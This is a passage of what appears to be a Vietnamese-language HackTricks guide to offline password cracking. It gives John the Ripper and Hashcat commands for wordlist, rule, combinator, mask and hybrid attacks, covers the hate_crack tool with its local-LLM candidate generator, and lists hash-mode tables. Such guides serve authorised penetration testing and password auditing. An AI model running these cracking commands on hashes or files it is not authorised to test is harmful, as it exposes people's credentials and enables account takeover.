./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```

## Công cụ

**Ví dụ về hash:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### Hash-identifier

```bash
hash-identifier
> <HASH>
```

### Danh sách từ

- **Rockyou**
- [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
- [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
- [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **Công cụ tạo danh sách từ**

- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Công cụ tạo chuỗi gõ phím nâng cao với các ký tự cơ sở, sơ đồ bàn phím và tuyến gõ có thể cấu hình.

```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```

### John mutation

Đọc _**/etc/john/john.conf**_ và cấu hình nó.

```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```

### Hashcat

#### Các kiểu tấn công của Hashcat

- **Wordlist attack** (`-a 0`) với rules

**Hashcat** đã có sẵn **một thư mục chứa rules**, nhưng bạn có thể tìm thấy [**các rules thú vị khác tại đây**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).

```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```

#### Giải thích và phân tích các tệp rule

Các rule của Hashcat thực thi opcode từ trái sang phải. Điều này dễ bị hiểu nhầm khi các thao tác tác động ở vị trí 0: `^e ^h ^t` thêm lần lượt `e`, rồi `h`, rồi `t` vào đầu chuỗi, do đó biến `password` thành `thepassword`. Các phép thay thế so sánh byte có phân biệt chữ hoa chữ thường, vì vậy rule như `sa@` sẽ không có tác dụng với chữ `A` viết hoa. Hãy kiểm tra các rule chưa quen thuộc với những baseword tiêu biểu viết thường, viết hoa và kết hợp cả hai trước khi tiêu tốn thời gian GPU.<sup>[[6]](#references)[[9]](#references)</sup>

[HashcatRosetta](https://github.com/bandrel/HashcatRosetta) có thể hiển thị từng ứng viên trung gian và tóm tắt phân bố opcode của toàn bộ tệp rule. Số lượng opcode thống kê cho biết tệp chủ yếu thêm ký tự vào cuối, thêm ký tự vào đầu, thay thế hay cắt bớt ký tự. Chúng không chứng minh được rằng một rule sẽ crack được mật khẩu, nhưng giúp chọn bộ rule phù hợp với các mẫu mật khẩu quan sát được ở nhóm mục tiêu.<sup>[[6]](#references)[[9]](#references)</sup>

```bash
uv tool install git+https://github.com/bandrel/HashcatRosetta.git
hashcat-rosetta --explain '^e ^h ^t' --baseword password
hashcat-rosetta rules.rule --analyze-rules
```

#### Giảm các rule dư thừa bằng debug log

Chế độ debug của Hashcat ghi lại các phép biến đổi rule riêng biệt với đầu ra trạng thái và kết quả thông thường. Mode `4` ghi `baseword:rule:candidate`; mode `5` bổ sung source wordlist. Luôn chỉ định rõ `--debug-file`. Nếu không, Hashcat sẽ mở `hashcat.debugfile` trong thư mục profile, còn việc chuyển hướng stdout sẽ thu luồng console thay vì các bản ghi này. Debug file được mở ở chế độ nối thêm, vì vậy hãy xóa hoặc xoay vòng file cũ trước khi đo lường lần mới và bảo vệ file vì nó chứa baseword và candidate ở dạng plaintext.<sup>[[7]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
rm -f debug.txt
hashcat -m 1000 -a 0 --debug-mode 5 --debug-file debug.txt \
  -r rules.rule hashes.txt wordlist.txt
hashcat-rosetta debug.txt --rules --metric candidates --top 25
hashcat-rosetta debug.txt --basewords --detail
hashcat-rosetta debug.txt --wordlists --detail
hashcat-rosetta debug.txt --export report.json --format json
```

Dùng `frequency` để tìm các quy tắc được áp dụng thường xuyên nhất, `basewords` để đo độ bao phủ các đầu vào riêng biệt và `candidates` để đếm số đầu ra riêng biệt. Xếp hạng candidate thường là điểm khởi đầu tốt nhất để tinh giản, vì một quy tắc được áp dụng thường xuyên vẫn có thể gộp nhiều đầu vào thành các candidate trùng lặp. Sao chép các quy tắc có giá trị cao nhất vào một tệp nhỏ hơn, chạy lại với các hash còn lại và so sánh báo cáo giữa các lần chạy. Mode `5` cũng cho biết mỗi wordlist nguồn có đóng góp baseword hữu ích hay không; buộc phân tích bằng `--debug-mode 4` hoặc `--debug-mode 5` khi dấu hai chấm trong dữ liệu khiến tính năng tự động phát hiện không xác định được.<sup>[[6]](#references)[[9]](#references)</sup>

- Tấn công **Wordlist combinator**

Có thể **kết hợp 2 wordlist thành 1** bằng hashcat.\
Nếu list 1 chứa từ **"hello"** và list thứ hai chứa 2 dòng với các từ **"world"** và **"earth"**, các từ `helloworld` và `helloearth` sẽ được tạo ra.

```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```

#### Tấn công combinator dựa trên ngữ pháp (ví dụ với Office được mã hóa)

Mật khẩu có thể dài và chứa nhiều nhóm ký tự nhưng vẫn có **không gian tìm kiếm hiệu dụng** nhỏ nếu tuân theo một ngữ pháp đã biết. Với tài liệu Office được mã hóa thu thập trong quá trình đánh giá được ủy quyền, `office2john.py` trích xuất bản ghi xác minh mật khẩu; nhờ đó có thể thử đoán mật khẩu cục bộ mà không gặp tình trạng khóa tài khoản, giới hạn tốc độ hoặc MFA khi đăng nhập trực tuyến. Công cụ này không vượt qua cơ chế mã hóa tài liệu.<sup>[[2]](#references)[[5]](#references)</sup>

Xóa trường tên tệp mà John thêm vào để Hashcat chỉ nhận được dữ liệu xác minh:<sup>[[2]](#references)</sup>

```bash
python3 /path/to/office2john.py secrets.xlsx | sed 's/^[^:]*://' > office.hash
head -c 40 office.hash; echo
```

Chọn `-m` dựa trên tiền tố được trích xuất, không dựa trên phần mở rộng tệp. Hashcat ánh xạ `$office$*2007*`, `$office$*2010*` và `$office$*2013*` sang các mode `9400`, `9500` và `9600`; các bản ghi `$oldoffice$0/$1` và `$oldoffice$3/$4` kiểu cũ lần lượt dùng mode `9700` và `9800`.<sup>[[3]](#references)</sup>

Nếu thông tin tình báo từ việc tái sử dụng mật khẩu, chính sách, gợi ý hoặc những người hiểu rõ người dùng cho thấy một cấu trúc như `<word><number><optional !><word>`, hãy tạo danh sách từ có thể liệt kê độc lập làm từ điển bên trái. Ví dụ này thử các số từ `0` đến `99`; hãy thay phạm vi và các phép biến đổi bằng bằng chứng thu thập được trong quá trình đánh giá.<sup>[[5]](#references)</sup>

```bash
while IFS= read -r word; do
  for number in $(seq 0 99); do
    printf '%s%s\n%s%s!\n' "$word" "$number" "$word" "$number"
  done
done < words.txt > wordsAndNumbers.txt
```

Hashcat attack mode `1` nối từng dòng trong dictionary bên phải vào từng dòng trong dictionary bên trái, vì vậy các tệp chứa lần lượt `L` và `R` dòng sẽ tạo ra `L × R` ứng viên trước khi áp dụng bất kỳ rules nào. Lệnh sau đây dành riêng cho record `$oldoffice$3/$4` cũ; hãy thay đổi mode đối với các định dạng Office khác.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

```bash
hashcat -m 9800 -a 1 office.hash wordsAndNumbers.txt english-88k-upper.txt
```

Mẫu tiền xử lý này có thể áp dụng cho các định dạng khác có thể xác minh ngoại tuyến: chỉ liệt kê các cách viết hoa, ngày tháng, dấu phân cách, chữ số hoặc dấu câu có khả năng xảy ra cho một thành phần, rồi kết hợp với thành phần còn lại thay vì brute-force toàn bộ độ dài danh nghĩa.<sup>[[4]](#references)[[5]](#references)</sup>

- **Mask attack** (`-a 3`)

```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```

#### Xác thực tệp `.hcmask` trước khi chạy

Một dòng sai định dạng có thể bị bỏ sót giữa các mask hợp lệ, vì vậy hãy xác thực toàn bộ tệp và keyspace ước tính trước khi khởi chạy cuộc tấn công. HashcatRosetta báo dòng bị lỗi và trả về trạng thái khác không nếu có bất kỳ mask nào không hợp lệ, nhờ đó bước kiểm tra này phù hợp để dùng trong script hoặc CI.<sup>[[6]](#references)[[9]](#references)</sup>

```bash
hashcat-rosetta masks.hcmask --verify-masks
```

Không chuẩn hóa các tệp mask bằng trình phân tích cú pháp CSV hoặc văn bản thông thường. Hashcat hỗ trợ các charset tùy chỉnh `?1` đến `?8`, chỉ coi `#` là comment khi nó là byte đầu tiên, và loại bỏ các ký tự escape dấu gạch chéo ngược trong một lượt trước khi diễn giải các token `?`. Vì vậy, khoảng trắng đứng trước `#` sẽ là dữ liệu mask, còn việc escape có thể làm thay đổi một chuỗi được hiểu là ký tự nguyên văn hay token charset.<sup>[[6]](#references)[[9]](#references)</sup>

- Wordlist + Mask (`-a 6`) / Mask + Wordlist (`-a 7`) attack

```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```

#### Các lượt chạy Hashcat được tối ưu theo mục tiêu với hate_crack

[hate_crack](https://github.com/trustedsec/hate_crack) điều phối các lượt chạy Hashcat cục bộ sau khi bạn có tệp hash và biết mode Hashcat của nó. Bạn phải cài đặt Hashcat riêng. Clone kèm submodule, chạy `make`, sau đó bắt đầu một phiên tương tác; mode ví dụ `1000` là NTLM, không phải giá trị mặc định dùng chung cho mọi trường hợp. Các bản clone hiện có cần chạy `git submodule update --init --recursive` trước khi sử dụng các tùy chọn PCFG và PRINCE-LING.<sup>[[13]](#references)[[14]](#references)</sup>

```bash
git clone --recurse-submodules https://github.com/trustedsec/hate_crack.git
cd hate_crack
make
hate_crack hashes.txt 1000
```

**Học một ngữ pháp từ các bản rõ thu thập được.** Chạy một lượt xử lý từ điển/quy tắc ban đầu, sau đó huấn luyện `pcfg_cracker` trên các bản rõ phù hợp với mục tiêu. Đặt `pcfgRuleset` trong `config.json` thành ruleset đã huấn luyện và chọn PCFG (menu `20`) để đưa các cấu trúc có khả năng cao vào Hashcat, hoặc PRINCE-LING (`21`) để tạo danh sách cơ sở PRINCE theo ngữ pháp. Giới hạn số lượng ứng viên của hai bộ tạo bằng `pcfgMaxCandidates` và `pcfgPrinceLingMaxCandidates`; hate_crack không huấn luyện ngữ pháp thay bạn. PCFG học xác suất của các cấu trúc như từ cơ sở cộng với chữ số và ký hiệu, khác với ngữ pháp cố định trong [ví dụ combinator](#grammar-driven-combinator-attacks-encrypted-office-example).<sup>[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
cd pcfg_cracker
python3 trainer.py -t ../target-plaintexts.txt -r TARGET
cd ..
# Set pcfgRuleset to TARGET in config.json, then select 20 or 21.
hate_crack hashes.txt 1000
```

**Suy ngược rules từ các mật khẩu đã biết.** Spoonman (menu `22`) nhận một corpus văn bản thuần, bao gồm tệp `.out` không rỗng của phiên hiện tại, rồi tạo các baseword chữ thường cùng Hashcat rules để tái tạo những mật khẩu đã quan sát được. Công cụ xếp hạng rules theo số mật khẩu trong corpus mà chúng tái tạo được. Bắt đầu với nhóm bao phủ 50% cao nhất và chỉ mở rộng nếu keyspace bổ sung là hợp lý; kết hợp các baseword được suy ra với những wordlist liên quan khác khi stem còn thiếu, chứ không phải mutation, là yếu tố giới hạn độ bao phủ. Hashcat chấp nhận tối đa 31 function cho mỗi rule và bảng chữ cái vị trí chỉ định các chỉ số `0`–`35`; Spoonman dùng baseword nguyên dạng và rule no-op khi không thể mã hóa mật khẩu. Corpus rất lớn có thể chạm giới hạn bộ đếm bộ nhớ hữu hạn của công cụ, vì vậy hãy xem độ bao phủ được báo cáo thay vì mặc định rằng đã tái tạo đầy đủ. Xem [hành vi của Hashcat rules](#explain-and-profile-rule-files) trước khi sử dụng độc lập đầu ra này.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

**Chọn generator phù hợp với bằng chứng hiện có.** OMEN (`13`) huấn luyện mô hình chuyển tiếp ký tự từ danh sách mật khẩu và liệt kê candidate theo thứ tự xác suất, với số lượng tối đa được giới hạn bởi `omenMaxCandidates`. Markov brute force (`15`) có thể tạo bảng `.hcstat2` từ các mật khẩu đã crack trong `.out` hiện tại hoặc từ danh sách được chọn, rồi thử một khoảng độ dài tăng dần. Khi thông tin về mục tiêu là văn xuôi chứ không phải mật khẩu, N-gram (`16`) đưa một corpus, kể cả đầu vào gzip, vào `ngramX.bin`; kích thước nhóm mặc định là ba. Đây là các lựa chọn thay thế cho nhau, không phải ba bản sao của cùng một danh sách candidate.<sup>[[11]](#references)[[13]](#references)[[14]](#references)</sup>

**Chỉ mở rộng các pool nhỏ, hợp lý.** Permutation (`17`) sắp xếp lại mọi ký tự trong từng từ đầu vào, vì vậy chỉ một từ dài tám ký tự cũng tạo ra `8!` thứ tự. Combipow (`19`) tạo các tổ hợp tập con không rỗng từ pool từ của một passphrase ngắn; `-s` chèn dấu cách và công cụ từ chối hơn 63 dòng đầu vào. Combinator (`6`) có thể nối nhiều wordlist bằng dấu phân cách thông qua `--sepFill`; thao tác nối thông thường giữa hai danh sách đã được [combinator tích hợp của Hashcat](#hashcat-attacks) ở trên hỗ trợ.<sup>[[13]](#references)[[14]](#references)</sup>

**Lập ngân sách cho các cuộc tấn công có phản hồi.** Fingerprint (`5`) mở rộng lặp lại các mật khẩu vừa crack theo độ dài mảnh tăng dần, thay vì mở rộng lại toàn bộ corpus ở mỗi vòng; ngưỡng keyspace kết hợp sẽ bỏ qua lượt `-a 1` quá lớn. Hybrid (`7`) thử các cách thêm `?s?d` ít tốn kém hơn trước khi thử các mask prepend/append `?a` rộng hơn, với `hcatHybridMaxRuntime` giới hạn thời gian chạy. Điều này quan trọng vì chi phí của một lượt hybrid bằng kích thước wordlist nhân với không gian mask, nên một mask rộng áp dụng cho danh sách lớn có thể tốn kém hơn nhiều so với các lượt ban đầu.<sup>[[13]](#references)[[14]](#references)</sup>

**Tạo candidate từ mật khẩu đã khôi phục bằng LLM cục bộ.** Sau khi lượt đầu tiên tạo được `<hashfile>.out` không rỗng, cuộc tấn công LLM của hate_crack (menu chính `12`, menu con **Cracked passwords** `3`) có thể suy luận các baseword, năm, hậu tố và kiểu viết hoa/thường đặc trưng cho mục tiêu, rồi gửi candidate mới cho Hashcat. Corpus nhỏ có thể đưa các plaintext đã khôi phục vào prompt của mô hình; corpus lớn hơn sẽ được tóm tắt thành số liệu thống kê. Phương pháp này khái quát hóa các quy ước đã quan sát được, thay vì chỉ phát lại [rules](#explain-and-profile-rule-files) hoặc [masks](#hashcat-attacks) cố định ở trên.<sup>[[13]](#references)[[14]](#references)</sup>

Cấu hình một mô hình Ollama cục bộ đã được phục vụ trong `.env` của hate_crack; công cụ không tự động tải mô hình. `OLLAMA_NO_CLOUD=true` từ chối các mô hình được gắn thẻ cloud và địa chỉ endpoint bên ngoài. Chỉ dùng endpoint localhost là chưa đủ: Ollama có thể proxy một mô hình `-cloud` từ xa, và prompt có thể chứa plaintext đã khôi phục hoặc số liệu thống kê của corpus. Thiết lập này vẫn cho phép endpoint trong mạng riêng và không thể loại trừ proxy truyền tải, vì vậy hãy xác minh đường đi của quá trình suy luận trước khi gửi dữ liệu khách hàng.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

```dotenv
LLM_BACKEND=ollama
OLLAMA_HOST=localhost:11434
OLLAMA_MODEL=qwen3:4b-instruct
OLLAMA_NO_CLOUD=true
```

```bash
hate_crack hashes.txt 1000
# Select 12 (LLM Attack), then 3 (Cracked passwords).
```

So sánh lượng ứng viên thu được với các lượt chạy rule, mask và được huấn luyện trên mục tiêu có chi phí thấp hơn trước khi phân bổ ngân sách lớn hơn. Model tạo ra các phỏng đoán; Hashcat vẫn kiểm tra chúng với các hash.<sup>[[13]](#references)[[14]](#references)</sup>

#### Các chế độ Hashcat

```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```

Cracking Hash Linux - tệp /etc/shadow

```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```

Bẻ khóa Hash Windows

```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```

Cracking các hash ứng dụng phổ biến

```
  900 | MD4                                              | Raw Hash
    0 | MD5                                              | Raw Hash
 5100 | Half MD5                                         | Raw Hash
  100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
 1400 | SHA-256                                          | Raw Hash
 1700 | SHA-512                                          | Raw Hash
```

## References

- [1] [Bên trong GoBruteforcer: cấu hình máy chủ mặc định do AI tạo, mật khẩu yếu và các chiến dịch tập trung vào crypto](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
- [2] [John the Ripper: `office2john.py`](https://github.com/openwall/john/blob/bleeding-jumbo/run/office2john.py)
- [3] [Các hash mẫu của Hashcat và các chế độ Microsoft Office](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [4] [Tấn công combinator của Hashcat](https://hashcat.net/wiki/doku.php?id=combinator_attack)
- [5] [Lập kế hoạch thừa kế thông tin xác thực](https://pentestpartners.com/security-blog/estate-planning-of-credentials)
- [6] [Kho lưu trữ HashcatRosetta](https://github.com/bandrel/HashcatRosetta)
- [7] [Cách triển khai tệp debug của Hashcat](https://github.com/hashcat/hashcat/blob/master/src/debugfile.c)
- [8] [Trợ giúp dòng lệnh Hashcat](https://github.com/hashcat/hashcat/blob/master/docs/hashcat-help.md)
- [9] [HashcatRosetta: Giải mã Rosetta Stone của việc bẻ khóa mật khẩu](https://trustedsec.com/blog/hashcatrosetta-reading-the-rosetta-stone-of-password-cracking)
- [10] [Kho lưu trữ và cách sử dụng PCFG Cracker](https://github.com/lakiw/pcfg_cracker)
- [11] [Kho lưu trữ và hướng dẫn sử dụng OMEN](https://github.com/RUB-SysSec/OMEN)
- [12] [Issue gốc và thiết kế suy ra rule của Spoonman](https://github.com/trustedsec/hate_crack/issues/169)
- [13] [Kho lưu trữ hate_crack và tài liệu về các cuộc tấn công](https://github.com/trustedsec/hate_crack)
- [14] [Những điểm mới trong hate_crack kể từ phiên bản 2.0](https://trustedsec.com/blog/whats-new-in-hate-crack-since-2-0)
- [15] [Chính sách đích đến LLM của hate_crack](https://github.com/trustedsec/hate_crack/blob/main/hate_crack/llm.py)
{{#include ../banners/hacktricks-training.md}}
